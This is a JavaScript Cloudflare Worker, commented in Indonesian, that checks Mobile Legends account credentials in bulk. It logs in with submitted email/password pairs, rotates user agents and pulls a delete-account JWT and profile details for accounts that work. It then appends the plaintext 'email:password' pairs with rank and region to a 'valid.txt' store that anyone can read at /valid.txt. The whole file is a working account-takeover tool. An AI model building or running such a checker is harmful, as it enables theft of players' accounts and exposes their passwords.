const ALLOWED_ORIGIN = "https://ca94bb9c.fronted-eqb.pages.dev";

addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request));
});

const USER_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (Linux; Android 10; SM-G973F)"
];

// Simulasi fungsi hash/sign seperti versi Python (MD5)
function md5(str) {
  return crypto.subtle.digest("MD5", new TextEncoder().encode(str))
    .then(buf => Array.from(new Uint8Array(buf)).map(x => x.toString(16).padStart(2, "0")).join(""));
}

async function handleRequest(request) {
  // Cek origin
  const origin = request.headers.get("Origin");
  if (origin && origin !== ALLOWED_ORIGIN) {
    return new Response("Forbidden", { status: 403 });
  }

  const url = new URL(request.url);

  if (url.pathname === "/check" && request.method === "POST") {
    const form = await request.formData();
    const email = form.get("email");
    const password = form.get("password");
    const e_captcha = form.get("e_captcha");

    if (!email || !password || !e_captcha) {
      return Response.json({ code: 400, msg: "Missing fields" });
    }

    try {
      const md5pwd = await md5(password);
      const rawSign = `account=${email}&e_captcha=${e_captcha}&md5pwd=${md5pwd}&op=login_captcha`;
      const sign = await md5(rawSign);

      // 1. Login ke MLBB API
      const loginResp = await fetch("https://accountmtapi.mobilelegends.com/", {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] },
        body: JSON.stringify({
          op: "login_captcha",
          lang: "en",
          sign,
          params: { account: email, md5pwd, e_captcha }
        })
      });

      const loginData = await loginResp.json();

      // Cek error khusus
      if (loginData.code === 1004) return Response.json({ code: 1004, msg: "Error_NoAccount", email });
      if (loginData.code === 1005) return Response.json({ code: 1005, msg: "Error_PasswdError", email });
      if (loginData.code !== 0 || !loginData.data) return Response.json({ code: loginData.code || 500, msg: loginData.message || "Login failed" });

      const { guid, session } = loginData.data;

      // 2. Ambil delete token / JWT
      const deleteResp = await fetch("https://api.mobilelegends.com/tools/deleteaccount/getToken", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded", "User-Agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] },
        body: `id=${guid}&token=${session}&type=mt_And`
      });
      const deleteData = await deleteResp.json();
      const jwt_token = deleteData.data?.jwt;
      if (!jwt_token) return Response.json({ code: 500, msg: "No JWT" });

      // 3. Ambil base info
      const baseResp = await fetch("https://api.mobilelegends.com/base/getBaseInfo", {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${jwt_token}`,
          "Content-Type": "application/json",
          "User-Agent": USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]
        },
        body: JSON.stringify({})
      });
      const baseInfo = (await baseResp.json()).data || {};

      const result = {
        email,
        password,
        name: baseInfo.name || "N/A",
        level: baseInfo.level || "N/A",
        rank_level: baseInfo.rank_level || "N/A",
        roleId: baseInfo.roleId || "N/A",
        zoneId: baseInfo.zoneId || "N/A",
        reg_country: baseInfo.reg_country || "N/A"
      };

      // Simpan otomatis ke KV
      const line = `${email}:${password} | Name: ${result.name} | Level: ${result.level} | Rank: ${result.rank_level} | RoleID: ${result.roleId} | ZoneID: ${result.zoneId} | Country: ${result.reg_country}\n`;
      const old = (await VALID_ACCOUNTS.get("valid.txt")) || "";
      await VALID_ACCOUNTS.put("valid.txt", old + line);

      return Response.json({ code: 0, data: result });

    } catch (err) {
      return Response.json({ code: 500, msg: err.toString() });
    }

  } else if (url.pathname === "/save-valid" && request.method === "POST") {
    try {
      const kvData = await request.json();
      const accountLine = kvData.account;
      if (!accountLine) return Response.json({ code: 400, msg: "Missing account line" });

      const old = (await VALID_ACCOUNTS.get("valid.txt")) || "";
      await VALID_ACCOUNTS.put("valid.txt", old + accountLine + "\n");

      return Response.json({ code: 0, msg: "Saved" });
    } catch (err) {
      return Response.json({ code: 500, msg: err.toString() });
    }
  } else if (url.pathname === "/valid.txt" && request.method === "GET") {
    const file = await VALID_ACCOUNTS.get("valid.txt") || "";
    return new Response(file, { headers: { "Content-Type": "text/plain" } });
  }

  return new Response("Not Found", { status: 404 });
}
